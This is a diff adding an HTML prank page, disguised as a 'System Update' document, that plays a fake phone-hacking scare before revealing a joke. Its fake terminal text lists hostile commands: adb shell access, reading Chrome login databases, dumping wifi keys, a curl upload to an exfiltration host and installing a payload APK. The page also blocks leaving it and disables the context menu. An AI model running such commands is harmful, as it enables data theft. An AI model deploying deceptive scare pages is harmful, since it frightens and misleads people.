@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>System Update</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: #000;
+    color: #00ff41;
+    font-family: 'Courier New', monospace;
+    overflow: hidden;
+    width: 100vw;
+    height: 100vh;
+    cursor: none;
+    user-select: none;
+    -webkit-user-select: none;
+  }
+
+  #start-screen {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    width: 100%;
+    height: 100%;
+    background: #111;
+    color: #aaa;
+    font-size: 1.2rem;
+    text-align: center;
+    padding: 2rem;
+    cursor: pointer;
+  }
+
+  #start-screen span {
+    animation: pulse 2s ease-in-out infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 0.5; }
+    50% { opacity: 1; }
+  }
+
+  #hack-screen { display: none; width: 100%; height: 100%; position: relative; }
+
+  #terminal {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%;
+    height: 100%;
+    padding: 10px;
+    overflow: hidden;
+    font-size: 0.75rem;
+    line-height: 1.4;
+    z-index: 1;
+    opacity: 0.25;
+  }
+
+  #overlay {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    z-index: 10;
+    text-align: center;
+    width: 90%;
+    max-width: 500px;
+  }
+
+  #main-warning {
+    font-size: 1.8rem;
+    font-weight: bold;
+    color: #ff0000;
+    text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
+    animation: glitch 0.3s infinite;
+    margin-bottom: 1.5rem;
+  }
+
+  #status-line {
+    font-size: 1rem;
+    color: #00ff41;
+    margin-bottom: 1rem;
+    min-height: 1.5em;
+  }
+
+  #progress-container {
+    width: 100%;
+    height: 20px;
+    background: #111;
+    border: 1px solid #00ff41;
+    margin-bottom: 1.5rem;
+    display: none;
+  }
+
+  #progress-bar {
+    height: 100%;
+    width: 0%;
+    background: #00ff41;
+    transition: width 0.3s;
+    box-shadow: 0 0 10px #00ff41;
+  }
+
+  #file-list {
+    text-align: left;
+    font-size: 0.75rem;
+    color: #ff4444;
+    max-height: 120px;
+    overflow: hidden;
+    margin-bottom: 1rem;
+  }
+
+  #skull {
+    display: none;
+    font-size: 0.45rem;
+    line-height: 1.1;
+    color: #ff0000;
+    white-space: pre;
+    text-shadow: 0 0 5px #ff0000;
+    margin: 0 auto;
+  }
+
+  .scanline {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%;
+    height: 100%;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0, 255, 65, 0.03) 2px,
+      rgba(0, 255, 65, 0.03) 4px
+    );
+    pointer-events: none;
+    z-index: 100;
+  }
+
+  .flash {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%;
+    height: 100%;
+    background: #fff;
+    z-index: 200;
+    animation: flashAnim 0.15s ease-out forwards;
+    pointer-events: none;
+  }
+
+  @keyframes flashAnim {
+    0% { opacity: 0.9; }
+    100% { opacity: 0; }
+  }
+
+  @keyframes glitch {
+    0% { transform: translate(0); }
+    20% { transform: translate(-3px, 3px); }
+    40% { transform: translate(3px, -3px); }
+    60% { transform: translate(-2px, -2px); }
+    80% { transform: translate(2px, 2px); }
+    100% { transform: translate(0); }
+  }
+
+  #final-screen {
+    display: none;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 300;
+    background: #000;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    text-align: center;
+    padding: 2rem;
+  }
+
+  #final-screen .gotcha {
+    font-size: 2.5rem;
+    color: #00ff41;
+    margin-bottom: 1rem;
+    animation: pulse 1s ease-in-out infinite;
+  }
+
+  #final-screen .sub {
+    font-size: 1rem;
+    color: #888;
+  }
+</style>
+</head>
+<body>
+
+<div id="start-screen" onclick="beginHack()">
+  <span>📋 Tap to view document</span>
+</div>
+
+<div id="hack-screen">
+  <div id="terminal"></div>
+  <div id="overlay">
+    <div id="main-warning">⚠ DEVICE COMPROMISED ⚠</div>
+    <div id="status-line"></div>
+    <div id="progress-container"><div id="progress-bar"></div></div>
+    <div id="file-list"></div>
+    <pre id="skull"></pre>
+  </div>
+  <div class="scanline"></div>
+</div>
+
+<div id="final-screen">
+  <div class="gotcha">😂 YOU GOT PRANKED 😂</div>
+  <div class="sub">Relax — nothing happened. Your phone is fine.<br>No data was accessed. No files were touched.<br><br>Just a harmless prank page. 👋</div>
+</div>
+
+<script>
+const termEl = document.getElementById('terminal');
+const statusEl = document.getElementById('status-line');
+const progressContainer = document.getElementById('progress-container');
+const progressBar = document.getElementById('progress-bar');
+const fileListEl = document.getElementById('file-list');
+const skullEl = document.getElementById('skull');
+const hackScreen = document.getElementById('hack-screen');
+const startScreen = document.getElementById('start-screen');
+const finalScreen = document.getElementById('final-screen');
+
+const termLines = [
+  'root@kali:~# nmap -sV -O target_device',
+  'Starting Nmap 7.94 ( https://nmap.org )',
+  'Discovered open port 443/tcp',
+  'Discovered open port 8080/tcp',
+  'Discovered open port 5555/tcp (adb)',
+  'OS detection: Android 13+ (Linux 5.15)',
+  'root@kali:~# adb connect target:5555',
+  'connected to target:5555',
+  'root@kali:~# adb shell',
+  'shell@target:/ $ whoami',
+  'root',
+  'shell@target:/ $ cat /proc/cpuinfo',
+  'Processor: Qualcomm Snapdragon 8 Gen 2',
+  'shell@target:/ $ ls /sdcard/DCIM/Camera/',
+  'IMG_20240101_134522.jpg',
+  'IMG_20240215_091033.jpg',
+  'VID_20240301_220145.mp4',
+  'IMG_20240322_183711.jpg',
+  'shell@target:/ $ ls /data/data/com.android.chrome/databases/',
+  'Login Data',
+  'Cookies',
+  'History',
+  'Web Data',
+  'shell@target:/ $ sqlite3 "Login Data"',
+  'SELECT origin_url, username_value FROM logins;',
+  'facebook.com | ****@gmail.com',
+  'instagram.com | ****@gmail.com',
+  'twitter.com | ****@outlook.com',
+  'shell@target:/ $ dumpsys wifi | grep psk',
+  'PreSharedKey: ************',
+  'shell@target:/ $ cat /sdcard/WhatsApp/Databases/msgstore.db',
+  'Extracting messages...',
+  'shell@target:/ $ am start -a android.media.action.STILL_IMAGE_CAMERA',
+  'Starting: Intent { act=android.media.action.STILL_IMAGE_CAMERA }',
+  'shell@target:/ $ screenrecord /sdcard/capture.mp4 &',
+  '[1] Recording screen...',
+  'shell@target:/ $ input tap 500 1200',
+  'shell@target:/ $ svc data enable',
+  'shell@target:/ $ curl -X POST https://exfil-server.net/upload -F "file=@/sdcard/data.tar.gz"',
+  'Uploading... 100%',
+  'shell@target:/ $ pm install /sdcard/payload.apk',
+  'Success',
+  'shell@target:/ $ echo "Persistence established"',
+  'Persistence established',
+];
+
+const statusMessages = [
+  { text: 'Bypassing lock screen...', duration: 2000 },
+  { text: 'Accessing file system...', duration: 2000 },
+  { text: 'Reading contacts... (1,247 found)', duration: 2500 },
+  { text: 'Downloading photos... (438 files)', duration: 4000, progress: true },
+  { text: 'Extracting saved passwords...', duration: 3000, progress: true },
+  { text: 'Copying WhatsApp messages...', duration: 3000, progress: true },
+  { text: 'Activating front camera...', duration: 2000 },
+  { text: 'Recording screen...', duration: 2000 },
+  { text: 'Installing backdoor...', duration: 3000, progress: true },
+  { text: 'Uploading data to remote server...', duration: 4000, progress: true },
+  { text: 'TRANSFER COMPLETE', duration: 2000 },
+];
+
+const fakeFiles = [
+  '📁 /DCIM/Camera/IMG_2024_0322.jpg — COPIED',
+  '📁 /WhatsApp/Media/Photos/ — 203 files COPIED',
+  '🔑 Chrome passwords — 14 entries EXTRACTED',
+  '🔑 WiFi credentials — 3 networks CAPTURED',
+  '📱 Contacts.vcf — 1,247 entries EXPORTED',
+  '💬 WhatsApp/msgstore.db — COPIED',
+  '📍 Location history — DOWNLOADED',
+  '📷 Front camera — SNAPSHOT TAKEN',
+  '🎥 Screen recording — ACTIVE',
+  '⚙ Backdoor APK — INSTALLED',
+];
+
+const skullArt = `
+      _______________
+     /               \\
+    /                 \\
+   /    ___     ___    \\
+  |    /   \\   /   \\    |
+  |   | x   | | x  |   |
+  |    \\___/   \\___/    |
+  |                     |
+  |       _______       |
+  |      |       |      |
+   \\     |  ___  |     /
+    \\    | |   | |    /
+     \\   |_|   |_|   /
+      \\_____________/
+    DEVICE COMPROMISED
+     ALL DATA COPIED
+`;
+
+let termLineIndex = 0;
+let termInterval;
+
+function beginHack() {
+  startScreen.style.display = 'none';
+  hackScreen.style.display = 'block';
+
+  // Try fullscreen
+  const el = document.documentElement;
+  if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
+  else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+
+  // Vibrate if available
+  if (navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 500]);
+
+  // Start background terminal scroll
+  termInterval = setInterval(() => {
+    if (termLineIndex < termLines.length) {
+      termEl.innerHTML += termLines[termLineIndex] + '\n';
+      termLineIndex++;
+    } else {
+      // Loop with random hex garbage
+      const hex = Array.from({length: 60}, () =>
+        Math.floor(Math.random()*256).toString(16).padStart(2,'0')
+      ).join(' ');
+      termEl.innerHTML += hex + '\n';
+    }
+    termEl.scrollTop = termEl.scrollHeight;
+  }, 250);
+
+  // Run status sequence
+  runStatusSequence();
+}
+
+async function runStatusSequence() {
+  await sleep(1500);
+
+  for (let i = 0; i < statusMessages.length; i++) {
+    const msg = statusMessages[i];
+    statusEl.textContent = msg.text;
+
+    if (msg.progress) {
+      progressContainer.style.display = 'block';
+      await animateProgress(msg.duration);
+      progressContainer.style.display = 'none';
+      progressBar.style.width = '0%';
+    } else {
+      await sleep(msg.duration);
+    }
+
+    // Add fake files during download phases
+    if (i >= 3 && i <= 9 && fakeFiles[i - 3]) {
+      const div = document.createElement('div');
+      div.textContent = fakeFiles[i - 3];
+      fileListEl.appendChild(div);
+    }
+
+    // Flash effect on some steps
+    if (i === 0 || i === 6 || i === 8) {
+      flash();
+      if (navigator.vibrate) navigator.vibrate(300);
+    }
+  }
+
+  // Final scare — skull
+  await sleep(500);
+  statusEl.textContent = '';
+  fileListEl.innerHTML = '';
+  document.getElementById('main-warning').style.display = 'none';
+  skullEl.textContent = skullArt;
+  skullEl.style.display = 'block';
+
+  flash();
+  if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 1000]);
+
+  // Red flicker
+  let flickers = 0;
+  const flickerInterval = setInterval(() => {
+    document.body.style.background = flickers % 2 === 0 ? '#220000' : '#000';
+    flickers++;
+    if (flickers > 10) {
+      clearInterval(flickerInterval);
+      document.body.style.background = '#000';
+    }
+  }, 150);
+
+  // After scare, reveal prank
+  await sleep(5000);
+  clearInterval(termInterval);
+  hackScreen.style.display = 'none';
+  finalScreen.style.display = 'flex';
+  if (document.exitFullscreen) document.exitFullscreen().catch(()=>{});
+
+  if (navigator.vibrate) navigator.vibrate(0); // stop vibration
+}
+
+function animateProgress(duration) {
+  return new Promise(resolve => {
+    const start = Date.now();
+    const tick = () => {
+      const elapsed = Date.now() - start;
+      const pct = Math.min((elapsed / duration) * 100, 100);
+      progressBar.style.width = pct + '%';
+      if (elapsed < duration) requestAnimationFrame(tick);
+      else resolve();
+    };
+    tick();
+  });
+}
+
+function flash() {
+  const f = document.createElement('div');
+  f.className = 'flash';
+  document.body.appendChild(f);
+  setTimeout(() => f.remove(), 200);
+}
+
+function sleep(ms) {
+  return new Promise(r => setTimeout(r, ms));
+}
+
+// Prevent back button / closing easily (adds mild annoyance)
+window.addEventListener('beforeunload', e => {
+  e.preventDefault();
+  e.returnValue = '';
+});
+
+// Disable context menu and text selection
+document.addEventListener('contextmenu', e => e.preventDefault());
+</script>
+
+</body>
+</html>
